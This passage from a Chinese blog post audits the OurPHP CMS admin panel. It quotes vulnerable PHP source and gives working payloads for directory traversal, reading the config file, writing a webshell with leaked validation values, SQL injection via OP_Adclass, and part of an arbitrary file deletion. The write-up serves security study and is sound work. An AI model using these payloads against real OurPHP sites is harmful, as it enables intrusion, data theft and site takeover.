<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>跟着Y4师傅学代码审计-OurPHP | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>跟着Y4师傅学代码审计-OurPHP</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-12-05T16:00:00.000Z" id="date"> 2022-12-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-12-06T03:53:14.921Z" id="updated"> 2022-12-06</time></div></span></div></div><hr><div id="post-content"><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这是代码审计的第四篇OurPHP，最近实验作业ddl好多，整的心里边烦躁，静下心来看看代码</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221204233336537.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221204233336537.png" alt="image-20221204233336537"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><strong>目录遍历漏洞</strong></p>
<p>还是从后台模板开始看，随便点击一个模板看看url <code>/client/manage/ourphp_filebox.php?path=user/css&amp;dir</code></p>
<p>我们可以定位到对应的执行文件函数处</p>
<p>首先针对path变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ourphp_out&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">listDirFiles</span>(<span class="hljs-string">&#x27;../../templates/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br>        <span class="hljs-variable">$file2</span> = <span class="hljs-string">&#x27;../../templates/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">listDirFiles</span>(<span class="hljs-string">&#x27;../../&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br>        <span class="hljs-variable">$file2</span> = <span class="hljs-string">&#x27;../../&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];  <br>    &#125;<br></code></pre></td></tr></table></figure>
<p>跟进<code>listDirFiles</code>函数，可以看到是一个常规的递归读取目录下的文件并返回所有的文件名集合。而前面并未对path变量作任何限制，所以存在目录遍历，然后看怎么回显至页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listDirFiles</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<span class="hljs-comment">//如果是目录，则进行下一步操作</span><br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$dir</span>);<span class="hljs-comment">//打开目录</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$d</span>) &#123;<span class="hljs-comment">//目录打开正常</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$d</span>)) !== <span class="hljs-literal">false</span>) &#123;<span class="hljs-comment">//循环读出目录下的文件，直到读不到为止</span><br>                <span class="hljs-keyword">if</span>  (<span class="hljs-variable">$file</span> != <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&#x27;..&#x27;</span>) &#123;<span class="hljs-comment">//排除一个点和两个点</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//如果当前是目录</span><br>                        <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$file</span>] = <span class="hljs-title function_ invoke__">listDirFiles</span>(<span class="hljs-variable">$file</span>);<span class="hljs-comment">//进一步获取该目录里的文件</span><br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$arr</span>[] = <span class="hljs-variable">$file</span>;<span class="hljs-comment">//记录文件名</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$d</span>);<span class="hljs-comment">//关闭句柄</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里就用到了dir的作用，也就是如果存在dir传参，就会根据不同的文件形式，包括<code>.</code>和<code>..</code>都作成列表展示在页面上</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221205235835409.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221205235835409.png" alt="image-20221205235835409"></p>
<p>那就很简单了，直接读一下配置文件对应目录（之前设置了一个口令）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">path=../config/&amp;dir<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000339703.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000339703.png" alt="image-20221206000339703"></p>
<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>和上面类似，我们随便点一个文件看看传参</p>
<p><code>/client/manage/ourphp_filebox.php?path=../../templates/user/css/style.css&amp;edit</code>，很简单直接保证带着这两个参数，就能回显处任意文件内容</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000534621.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000534621.png" alt="image-20221206000534621"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">path=../../config/ourphp_config.php&amp;edit<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000942077.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206000942077.png" alt="image-20221206000942077"></p>
<h4 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h4><p>接着模板的思路来，随便点一个模板进行编辑然后保存，url为<code>/client/manage/ourphp_filebox.php?path=edit&amp;ok</code>，POST传参code和md</p>
<p>定位到对应代码处，可以看到这里首先会对code的内容以及md进行检验md2为safecode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;safecode&#x27; =&gt; &#x27;uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9&#x27;,	// 安全校验码<br></code></pre></td></tr></table></figure>
<p>这块对md的检验还是很死的，但是我们可以配合前面的任意文件读方法来获取到。我们往下看。<code>$_SESSION[&#39;ourphp_out&#39;]</code>这个Session不为空的话，我们实际上是可以写马的，因为基本没有对code作过滤。因此只要在md[0]处写好文件名就行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ok&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md&#x27;</span>]))&#123;<br>           <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不能为空呀！&lt;/h1&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$md</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md&#x27;</span>]);<br>        <span class="hljs-variable">$md2</span> = <span class="hljs-title function_ invoke__">MD5</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$ourphp</span>[<span class="hljs-string">&#x27;safecode&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">1</span>] != <span class="hljs-variable">$md2</span>)&#123;<br>            <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;验证不通过呀！&lt;/h1&gt;&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>		&#123;<br>			<span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$code</span>);<br>		&#125;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;ourphp_&quot;</span>, <span class="hljs-string">&quot;&lt;textarea&quot;</span>, <span class="hljs-variable">$code</span>);<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;/ourphp_&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;/textarea&gt;&quot;</span>, <span class="hljs-variable">$code</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ourphp_out&#x27;</span>]))<br>        &#123;<br>            <br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;&lt;?php&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;&lt;%&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;language=\&quot;php\&quot;&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;language=&#x27;php&#x27;&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;language=php&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&quot;&lt;?=&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.php&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.asp&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.aspx&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.jsp&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.htaccess&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.ini&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.user.ini&quot;</span>))<br>            &#123;<br>                <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不要提交违法代码！&lt;/h1&gt;&#x27;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br><br>                <span class="hljs-variable">$filego</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&#x27;w&#x27;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$filego</span>,<span class="hljs-variable">$code</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$filego</span>);<br><br>                <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;编辑成功！&lt;/h1&gt;&#x27;</span>;<br><br>            &#125;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.asp&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.aspx&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.jsp&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.htaccess&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.ini&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;.user.ini&quot;</span>))<br>            &#123;<br>                <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不要提交违法代码！&lt;/h1&gt;&#x27;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br><br>                <span class="hljs-variable">$filego</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$md</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&#x27;w&#x27;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$filego</span>,<span class="hljs-variable">$code</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$filego</span>);<br><br>                <span class="hljs-variable">$list</span> = <span class="hljs-string">&#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;编辑成功！&lt;/h1&gt;&#x27;</span>;<br><br>            &#125;<br><br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure>
<p>这里再来探究一下<code>$_SESSION[&#39;ourphp_out&#39;]</code>是咋得到的，全局搜索可定位到</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003106665.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003106665.png" alt="image-20221206003106665"></p>
<p>跟入pw方法，参数均可控。这里我们可以看到这个字段不为空的条件就是两个检验值符合条件，同样配合任意文件读取可得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pw</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>,<span class="hljs-variable">$ourphp</span>;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-variable">$ourphp</span>[<span class="hljs-string">&#x27;validation&#x27;</span>] &amp;&amp; <span class="hljs-variable">$b</span> == <span class="hljs-variable">$ourphp</span>[<span class="hljs-string">&#x27;safecode&#x27;</span>])&#123;<br>         <br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ourphp_out&#x27;</span>] = <span class="hljs-string">&quot;ourphp&quot;</span>;<br>        <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ourphp_out&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;ourphp_checkadmin.php&#x27;</span>;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br><br>            <span class="hljs-title function_ invoke__">session_start</span>();<br><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">validation=831266&amp;safecode=uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9<br></code></pre></td></tr></table></figure>
<p>因此我们就可以在根目录写一个马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">path=edit&amp;ok&amp;validation=831266&amp;code=uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9 <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003819043.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003819043.png" alt="image-20221206003819043"></p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003838823.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206003838823.png" alt="image-20221206003838823"></p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>广告管理处，随便点一个进行编辑，保存。路由信息为<code>/client/manage/ourphp_adview.php?ourphp_cms=edit&amp;id=1</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ourphp_cms&quot;</span>] == <span class="hljs-string">&quot;edit&quot;</span>)&#123;<br><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Adclass&quot;</span>]))&#123;<br>		<span class="hljs-variable">$OP_Adclass</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Adclass&quot;</span>]);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$OP_Adclass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>	&#125;<br><br>	<span class="hljs-variable">$query</span> = <span class="hljs-variable">$db</span> -&gt; <span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&quot;`ourphp_ad`&quot;</span>,<span class="hljs-string">&quot;`OP_Adcontent` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">admin_sql</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;OP_Adcontent&quot;</span>]).<span class="hljs-string">&quot;&#x27;,`OP_Adclass` = &#x27;&quot;</span>.<span class="hljs-variable">$OP_Adclass</span>.<span class="hljs-string">&quot;&#x27;,`time` = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;where id = &quot;</span>.<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>	<span class="hljs-variable">$ourphp_font</span> = <span class="hljs-number">1</span>;<br>	<span class="hljs-variable">$ourphp_class</span> = <span class="hljs-string">&#x27;ourphp_ad.php?id=ourphp&#x27;</span>;<br>	<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;ourphp_remind.php&#x27;</span>;<br>			<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里可以看到如果传递了get参数<code>outphp_cms</code>为edit值，就会存在一个update语句，其中id因为会被转为整数我们没啥可利用的，关注POST传参OP_Adcontent值上，先跟入admin_sql方法。</p>
<p>这里可以看到里面就是简单的替换单引号</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206085946479.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206085946479.png" alt="image-20221206085946479"></p>
<p>以及OP_Adclass值更是没任何过滤，并且是由POST传参过来（传递一个数组）</p>
<p>首先就是我们可以回显出任意想要的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">OP_Adclass[]=&#x27;, OP_Adclass=version() #<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206092236982.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206092236982.png" alt="image-20221206092236982"></p>
<h4 id="任意文件删除1"><a href="#任意文件删除1" class="headerlink" title="任意文件删除1"></a>任意文件删除1</h4><p>该网站还有一个数据库备份的功能，关注路由<code>/client/manage/ourphp_bakgo.php</code></p>
<p>sink点如下，会对dfile里面的参数值进行删除，同时要满足filedeled值为1</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094428598.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094428598.png" alt="image-20221206094428598"></p>
<p>我们往前看有无干扰执行到这里的语句</p>
<ol>
<li><p>对dir参数有一个验证操作</p>
<p class='item-img' data-src='/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094821217.png'><img src="/2022/12/06/OurPHP%E5%88%86%E6%9E%90/image-20221206094821217.png" alt="image-20221206094821217"></p>
<p>实际上底下会去对目录中的文件进行计数($dfileNo)，如果不为0的话将会干扰到后面的文件删除操作，但是注意到我们可以控制filedeled值，使得不进入循环。当然也可以dir随便传一个让其创建一个空目录，其中自然也就没有文件计数。</p>
